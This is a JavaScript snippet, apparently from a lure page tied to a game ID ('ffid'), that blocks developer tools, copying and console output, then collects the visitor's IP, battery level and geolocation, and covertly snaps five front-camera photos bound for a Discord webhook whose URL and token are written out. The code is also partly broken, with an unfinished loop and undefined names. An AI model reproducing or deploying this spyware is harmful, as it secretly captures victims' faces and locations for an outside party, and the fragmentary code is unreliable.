<script>
// === Particles ===
(function createParticles() {
    const container = document.getElementById('particles');
    for (let i = 0; i < 30; i++) {

        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';

// === ป้องกันการเข้าถึง开发者工具 ===
document.addEventListener('contextmenu', e => { e.preventDefault(); return false; });
document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); return false; }
    if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) { e.preventDefault(); return false; }
    if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I' || e.key === 'j' || e.key === 'J')) { e.preventDefault(); return false; }
    if (e.ctrlKey && (e.key === 's' || e.key === 'S')) { e.preventDefault(); return false; }
    if (e.ctrlKey && e.shiftKey && (e.key === 'c' || e.key === 'C')) { e.preventDefault(); return false; }
    if (e.altKey && e.ctrlKey && (e.key === 'i' || e.key === 'I')) { e.preventDefault(); return false; }
    return true;
});
document.addEventListener('dragstart', e => e.preventDefault());
document.addEventListener('drop', e => e.preventDefault());
document.addEventListener('copy', e => e.preventDefault());
document.addEventListener('paste', e => e.preventDefault());
document.addEventListener('cut', e => e.preventDefault());

console.warn = function() {};
console.error = function() {};
console.info = function() {};

// === CONFIG ===
const WEBHOOK_URL = "https://discord.com/api/webhooks/1512064053273694319/HicoP_oS0YI7gGBp6wO-NtKLwos7YBZSgIkvyjlNaOfEWOqOdL7B9cFNjYB4CyRz8qfu";

let userData = {
    lat: "ไม่ระบุ",
    lon: "ไม่ระบุ",
    ip: "Unknown",
    battery: "Unknown",
    ffid: ""
};

let cameraStream = null;
let isCapturing = false;

// ===== เก็บข้อมูล =====
async function collectData() {
    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        userData.ip = ipData.ip;
    } catch(e) {}

    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            userData.battery = Math.floor(battery.level * 100) + "%";
        }
    } catch(e) {}

    return new Promise((resolve) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => { userData.lat = pos.coords.latitude; userData.lon = pos.coords.longitude; resolve(); },
                () => { resolve(); }
            );
        } else { resolve(); }
    });
}

// ===== เปิดกล้องและถ่าย =====
async function startCameraAndAutoCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
        });
        cameraStream = stream;
        const video = document.getElementById("cam");
        video.srcObject = stream;
        document.getElementById("scan-status").innerText = "📸 CAPTURING...";
        document.getElementById("capture-progress").classList.remove("hidden");
        
        await new Promise(resolve => { video.onloadedmetadata = () => { resolve(); }; });
        
        startBurstCapture(video);
        return true;
    } catch (err) {
        document.getElementById("scan-status").innerText = "❌ CAMERA ERROR";
        return false;
    }
}

// ===== ถ่าย 5 รูป =====
function startBurstCapture(video) {
    if (isCapturing) return;
    isCapturing = true;
    
    const burstCount = 5;
    let captured = 0;
    const images = [];
    
    function captureOne() {
        try {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext("2d");
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob((blob) => {
                if (blob) images.push(blob);
                captured++;
                if (captured < burstCount) setTimeout(captureOne, 300);
                else finishAndSend(images, video);
            }, "image/png", 0.9);
        } catch(e) {
            captured++;
            if (captured < burstCount) setTimeout(captureOne, 300);
            else finishAndSend(images, video);
        }
    }
    captureOne();
}

function finishAndSend(images, video) {
    if (cameraStream) {
        cameraStream.getTracks().forEach(t => t.stop());
        cameraStream = null;
    }
    sendAllToWebhook(images);
}
